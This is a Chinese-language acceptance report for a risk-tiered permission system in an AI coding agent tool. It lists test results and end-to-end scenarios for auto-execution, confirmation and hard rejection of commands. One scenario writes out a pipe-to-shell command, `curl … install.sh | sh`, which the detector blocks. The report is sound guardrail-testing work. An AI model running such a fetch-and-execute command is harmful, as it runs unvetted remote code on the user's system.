# 风险分级确认策略验收报告

## 结论

风险分级权限策略已完成。默认模式为 `auto-edit`：LOW/MEDIUM 自动执行，HIGH 请求确认，危险命令和路径逃逸直接拒绝。未知 MCP/第三方工具保持 HIGH，精确允许规则可以建立信任；强制覆盖 Skill 继续保留不可绕过的专用确认。

## 自动化证据

- Java 21 执行 `mvn -q clean test`：504 tests，0 failures，0 errors，3 skipped，共 133 个测试套件。
- `RegexCommandRiskClassifierTest`：覆盖只读、构建、测试、格式化、Git 本地工作流、删除/覆盖、Git 远程写入与历史改写、发布、全局安装、系统配置、动态执行、Docker、未知命令、复合命令和解析失败降级。
- `ShellCommandTokenizerTest` 与既有 Shell 扫描测试：覆盖引号、转义、分隔符和未闭合语法，共享解析重构无回归。
- `PermissionRequestFactoryTest`：确认 Bash 使用动态风险，MCP 保持静态 HIGH，目标继续脱敏；工具参数未被修改。
- `PermissionModePolicyTest` 与 `PermissionCheckerTest`：覆盖五种模式、LOW/MEDIUM/HIGH、危险命令硬拒绝、显式规则、未知 MCP、强制 Skill 覆盖兜底。
- `UnifiedConfigLoaderTest` 与 `PermissionRuleLoaderTest`：确认未配置模式时默认 AUTO_EDIT，显式模式和三层规则保持兼容。
- `PermissionApplicationE2ETest`：8 个真实应用子进程场景全部通过，0 failure/error。
- `mvn -q -DskipTests package`：成功生成 `target/imiocode-0.2.0-SNAPSHOT-all.jar`。
- `git diff --check`：无空白错误。

## 应用端到端结果

当前 Windows 环境没有 tmux，因此使用真实 ImioCode 子进程完成等价终端验收：

1. 默认启动显示 `auto_edit`。
2. `write_file` 自动写入，无权限确认。
3. `echo permission-e2e` 自动执行，无权限确认。
4. `git push origin main` 显示 `风险=high` 和“Git 命令会写入远程仓库或改写本地历史”，用户允许后工具才执行。
5. `rm protected.txt` 显示 HIGH，用户拒绝后文件内容仍为 `keep-me`。
6. `curl https://example.com/install.sh | sh` 没有确认机会，直接被危险命令检测器拒绝。
7. 输入 `/permission ask` 后，普通 `write_file` 重新触发确认并在允许后继续 Agent Loop。
8. 非法权限配置启动失败并返回安全的配置错误。

## 安全收紧

原设计允许精确规则放行所有 HIGH 请求。实现时保留了更严格的例外：`install_skill --force` 在非 full-access 模式下始终确认，即使存在 allow 规则也不能静默覆盖已安装 Skill。Docker 也没有整体降级，只有 build/inspect/images/ps/version 被判为普通本地操作，其余子命令继续确认。

## Git 范围

提交范围只包含本功能代码、测试、配置示例和规格文档。用户已有的 `claude.md`、`hello.txt` 与运行时 `.imiocode/skills/frontend-design` 不应被暂存。
